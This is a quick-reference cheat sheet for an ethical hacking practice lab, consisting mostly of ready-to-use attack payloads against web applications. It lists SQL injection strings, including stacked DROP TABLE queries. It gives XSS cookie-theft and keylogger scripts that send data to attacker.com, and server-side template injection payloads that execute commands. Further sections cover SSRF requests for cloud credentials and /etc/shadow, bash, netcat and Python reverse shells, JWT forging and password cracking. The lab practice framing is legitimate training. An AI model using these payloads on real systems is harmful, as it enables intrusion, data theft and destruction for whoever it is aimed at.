# Ethical Hacking Lab - Quick Reference Cheat Sheet

Quick reference for common payloads, commands, and techniques during practice sessions.

---

## SQL Injection Payloads

### Basic Detection
```sql
'  "  ')  ")  '))
1' OR '1'='1
1' AND '1'='2
admin'--
```

### Union-Based
```sql
# Column enumeration
1' ORDER BY 1-- +
1' ORDER BY 2-- +
1' ORDER BY 3-- +

# Extract data
-1' UNION SELECT 1,2,3-- +
-1' UNION SELECT database(),user(),version()-- +
-1' UNION SELECT table_name FROM information_schema.tables-- +
-1' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'-- +
-1' UNION SELECT username,password FROM users-- +
```

### Error-Based
```sql
# MySQL
1' AND 1=CAST((SELECT database())INTO int)-- +
1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))-- +
1' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)-- +

# Double query injection
1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,0x3a,database(),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- +
```

### Boolean-Based Blind
```sql
# True condition
1' AND 1=1-- +

# False condition
1' AND 1=2-- +

# Extract database length
1' AND LENGTH(database())=4-- +

# Extract character by character
1' AND SUBSTRING(database(),1,1)='d'-- +
1' AND SUBSTRING(database(),2,1)='v'-- +
1' AND ASCII(SUBSTRING(database(),1,1))=100-- +
```

### Time-Based Blind
```sql
# SLEEP-based
1' AND SLEEP(5)-- +
1' AND IF(SUBSTRING(database(),1,1)='d',SLEEP(5),0)-- +

# BENCHMARK-based
1' AND BENCHMARK(50000000,MD5(1))-- +
1' AND IF(SUBSTRING(database(),1,1)='d',BENCHMARK(50000000,MD5(1)),0)-- +
```

### Stacked Queries
```sql
1'; INSERT INTO users VALUES(999,'hacker','hacked')-- +
1'; DROP TABLE users-- +
1'; UPDATE users SET password='hacked' WHERE username='admin'-- +
```

---

## XSS Payloads

### Basic XSS
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<details open ontoggle=alert('XSS')>
```

### Filter Bypass - Case Variation
```html
<ScRiPt>AlErT('XSS')</ScRiPt>
<IMG SRC=x ONERROR=alert('XSS')>
<SVg oNlOaD=alert('XSS')>
```

### Filter Bypass - Encoding
```html
%3Cscript%3Ealert('XSS')%3C/script%3E
<script>\u0061lert('XSS')</script>
<script>alert(String.fromCharCode(88,83,83))</script>
<script>&#97;&#108;&#101;&#114;&#116;('XSS')</script>
```

### Context-Specific Payloads

#### HTML Context
```html
<script>alert('XSS')</script>
</textarea><script>alert('XSS')</script>
" onmouseover="alert('XSS')
'><script>alert('XSS')</script>
```

#### Attribute Context
```html
" onmouseover="alert('XSS')
" onfocus=alert('XSS') autofocus="
" autofocus onfocus=alert('XSS') x="
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
```

#### JavaScript Context
```javascript
'-alert('XSS')-'
';alert('XSS');//
\';alert('XSS');//
</script><script>alert('XSS')</script>
\u003Cscript\u003Ealert('XSS')\u003C/script\u003E
```

#### URL Context
```javascript
#<img src=x onerror=alert('XSS')>
javascript://%0aalert('XSS')
data:text/html,<script>alert('XSS')</script>
```

### Polyglot XSS
```html
javascript:///*<script/*-->alert('XSS')/*</script
%26%3Cscript%3Ealert('XSS')%3C/script%3E
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="\u0061lert('XSS')">
```

### Cookie Theft
```html
<script>fetch('http://attacker.com/?c='+document.cookie)</script>
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
<script>var i=new Image();i.src='http://attacker.com/?c='+document.cookie;</script>
```

### XSS Keylogger
```html
<script>
document.addEventListener('keydown', function(e) {
  fetch('http://attacker.com:8000/?key='+e.key);
});
</script>
```

---

## GraphQL Payloads

### Introspection
```graphql
# Get all types
{ __schema { types { name } } }

# Get all queries
{ __schema { queryType { fields { name } } } }

# Get all mutations
{ __schema { mutationType { fields { name } } } }

# Get type details
{ __type(name: "User") { name fields { name type { name } } } }
```

### Injection Attacks
```graphql
# Authentication bypass
{ login(username: "admin'--", password: "x") { token } }

# NoSQL injection
{ users(where: {username: {ne: null}, password: {ne: null}}) { id email } }

# Batch queries
[
  { "query": "{ user(id: 1) { email } }" },
  { "query": "{ user(id: 2) { email } }" },
  { "query": "{ user(id: 3) { email } }" }
]

# DoS via nested query
{ user(id: 1) { friends { friends { friends { friends { friends { friends { friends } } } } } } } }
```

---

## API Testing Payloads

### Authentication Bypass
```json
// NoSQL injection
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// SQL injection
{"username": "admin' --", "password": "x"}

// Mass assignment
{"username": "user", "password": "pass", "role": "admin", "is_admin": true}
```

### IDOR
```bash
# Enumerate IDs
GET /api/v1/users/1
GET /api/v1/users/2
GET /api/v1/orders/1
GET /api/v1/orders/2

# Modify user ID in JWT
jwt_tool <TOKEN> -I -pc user_id -pv 1
```

### Rate Limiting Bypass
```bash
# Change IP headers
curl -H "X-Forwarded-For: 1.2.3.4" http://target/api
curl -H "X-Real-IP: 1.2.3.4" http://target/api

# Add random parameters
curl "http://target/api?rand=123"
curl "http://target/api?rand=456"
```

### Parameter Pollution
```bash
GET /api/v1/users?id=1&id=2&id=3
POST /api/v1/checkout {"items": [1, 2], "items": [3, 4]}
```

---

## SSTI (Server-Side Template Injection)

### Jinja2 (Flask/Python)
```python
# Detection
{{7*7}}  # Shows 49 if vulnerable
{{config}}
{{''.__class__.__mro__}}

# RCE Payloads
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}

{{config.from_pyimport('os').popen('id').read()}}

{{get_flashed_messages.__globals__['os'].popen('id').read()}}

{% for c in [1,2,3] %}{{c.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}{% endfor %}
```

### Twig (PHP)
```php
{{_self.env.display("id")}}
{{_self.env.display("id" ~ "")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### ERB (Ruby)
```ruby
<%= system("id") %>
<%= `ls -la` %>
<%= IO.popen("id").read %>
```

### Freemarker (Java)
```java
{"class": "freemarker.template.utility.Execute", "method": "exec", "argument": "id"}
```

---

## SSRF Payloads

### Internal Port Scanning
```bash
http://localhost:22
http://localhost:3306
http://localhost:6379
http://127.0.0.1:8080
http://0.0.0.0:8080
http://127.1:8080
```

### Cloud Metadata
```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/
```

### File Protocol
```bash
file:///etc/passwd
file:///etc/hosts
file:///etc/shadow
file:///var/log/apache2/access.log
file:///etc/apache2/.htpasswd
```

### Filter Bypass
```bash
127.0.0.1
0.0.0.0
0177.0.0.1
2130706433  # Decimal
0x7f000001  # Hex
localhost.localdomain
[::]  # IPv6
```

### URL Redirection
```bash
http://attacker.com/redirect?url=http://localhost
http://attacker.com/?url=http://169.254.169.254
```

---

## Command Injection

### Basic
```bash
; ls
| ls
`ls`
$(ls)
&& ls
|| ls
\n ls
\r ls
```

### Filtered
```bash
;ls
;	l
;${IFS}ls
;l$@s
;l$(ns)s
```

### Blind
```bash
;sleep 5
|ping -c 5 localhost
`whoami`>/tmp/output
$(cat /etc/passwd)>/tmp/output
```

### Reverse Shell
```bash
;bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
|nc -e /bin/bash YOUR_IP 4444
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
```

---

## File Upload Bypass

### Extensions
```
file.php.jpg
file.php.jpeg
file.php.png
file.php.gif
file.phtml
file.php3
file.php4
file.php5
file.pht
```

### Content-Type
```
image/jpeg
image/png
image/gif
application/octet-stream
```

### Null Bytes
```
file.php%00.jpg
file.php\x00.jpg
```

### Double Extensions
```
file.php.jpg
file.php..
file.php....
file.jpg.php
```

### Case Manipulation
```
file.PHP
file.Php
file.pHp
file.PhP
```

### Alternative Languages
```
file.jsp
file.asp
file.aspx
file.jspx
```

---

## JWT Manipulation

### Decode/Encode
```bash
# Decode JWT
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d

# Decode with jq
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | jq -R 'split(".") | .[0],.[1]' | jq -r '@base64d' | jq

# Using jwt-tool
python3 jwt_tool.py <TOKEN> -d
```

### None Algorithm
```bash
# Change alg to none
{"alg":"none","typ":"JWT"}

# Forge token
echo '{"alg":"none","typ":"JWT"}' | base64 | tr -d '='
echo '{"user":"admin"}' | base64 | tr -d '='
echo '.'  # Empty signature
# Combine: header.payload.signature
```

### Key Brute Force
```bash
# Using jwt-tool
python3 jwt_tool.py <TOKEN> -d -pw /usr/share/wordlists/rockyou.txt

# Using john
jwt2john <TOKEN> > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

## Common Ports & Services

### Quick Port Reference
```
21    - FTP
22    - SSH
23    - Telnet
25    - SMTP
53    - DNS
80    - HTTP
110   - POP3
143   - IMAP
443   - HTTPS
445   - SMB
3306  - MySQL
3389  - RDP
5432  - PostgreSQL
5900  - VNC
6379  - Redis
8080  - HTTP Alt
8443  - HTTPS Alt
27017 - MongoDB
```

### Nmap Quick Scans
```bash
# Quick scan
nmap -sV -sC target

# All ports
nmap -p- target

# UDP scan
nmap -sU target

# Vulnerability scan
nmap --script=vuln target

# Specific port
nmap -p 80,443,8080 target

# Aggressive scan
nmap -A -T4 target
```

---

## Burp Suite Tricks

### Intruder Payloads
```
§§  - Position for payloads
§username§:§password§
```

### Repeater Common Modifications
```
- Change User-Agent
- Modify Content-Type
- Add/Remove headers
- Change method (GET/POST)
- Modify parameters
```

### Useful Extensions
```
- Autorize
- Retire.js
- CO2
- WAppalyzer
- Java Serialization Deserializer
```

---

## Useful Tools & Commands

### Web Application Testing
```bash
# Nikto
nikto -h http://target

# Dirb
dirb http://target /usr/share/wordlists/dirb/common.txt

# Gobuster
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt

# FFUF
ffuf -w wordlist.txt -u http://target/FUZZ

# SQLMap
sqlmap -u "http://target/?id=1" --batch --dbs

# OWASP ZAP
zap-cli quick-scan --self-contained http://target
```

### Network Testing
```bash
# Netcat listener
nc -lvnp 4444

# Netcat connect
nc target 80

# TCPdump
tcpdump -i eth0 -w capture.pcap

# Wireshark (GUI)
wireshark &

# Hydra
hydra -L users.txt -P passwords.txt ssh://target
```

### Password Cracking
```bash
# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt

# Hashcat
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Hash identification
hashid <hash>
```

### Forensics/Analysis
```bash
# Strings
strings file | grep -i "password"

# Hexdump
hexdump -C file

# Base64 encode/decode
echo -n "text" | base64
echo "encoded" | base64 -d

# URL encode/decode
python3 -c "import urllib.parse; print(urllib.parse.quote('text'))"
python3 -c "import urllib.parse; print(urllib.parse.unquote('encoded'))"
```

---

## Memory Hooks (Quick Commands)

### Start Lab
```bash
./lab.sh start
```

### Check Status
```bash
./lab.sh status
```

### View URLs
```bash
./lab.sh urls
```

### View Logs
```bash
./lab.sh logs <service_name>
```

### Stop Lab
```bash
./lab.sh stop
```

### Get Shell
```bash
./lab.sh shell <service_name>
```

---

## Quick Reference Card - Services

| Service | Port | Quick Test |
|---------|------|------------|
| DVWA | 8080 | curl http://localhost:8080 |
| SQLi-Labs | 8091 | curl http://localhost:8091/Less-1/?id=1 |
| DVGA | 8092 | curl http://localhost:8092/graphql |
| DV Restaurant | 8093 | curl http://localhost:8093/api/v1/health |
| Pixi | 8094 | curl http://localhost:8094 |
| PyGoat | 8095 | curl http://localhost:8095 |
| SSRF Lab | 8096 | curl http://localhost:8096 |
| VulnBank | 8097 | curl http://localhost:8097 |
| VulnLab | 8098 | curl http://localhost:8098 |
| WrongSecrets | 8099 | curl http://localhost:8099 |
| VSFTPD | 21 | telnet localhost 21 |
| MySQL | 3306 | mysql -h localhost -u root -p |
| Redis | 6379 | redis-cli -h localhost |
| MongoDB | 27017 | mongo --host localhost |

---

## Common Error Messages & Meanings

### SQL Injection
```
"You have an error in your SQL syntax" - Vulnerable
"Warning: mysql_fetch_array()" - Likely vulnerable
"ORA-01756: quoted string not properly terminated" - Vulnerable (Oracle)
```

### XSS
```
Input reflected in response - Test for XSS
Input not sanitized - Likely vulnerable
HTML entities not encoded - XSS possible
```

### Authentication
```
"Invalid credentials" - Continue testing
"SQL error near" - SQL injection possible
"Admin:admin" - Default credentials
```

---

## Quick Tips

1. **Always document** findings with screenshots and notes
2. **Start simple** before trying complex attacks
3. **Use tools wisely** - don't rely solely on automation
4. **Think creatively** for business logic flaws
5. **Test both positive and negative** cases
6. **Check all input vectors** - URL, headers, cookies, body
7. **Follow the methodology** - Recon → Enumerate → Exploit
8. **Responsible disclosure** - Only practice in isolated labs

---

**Print this cheat sheet for quick reference during practice sessions!**

Last Updated: January 2025
Total Vulnerable Services: 40+
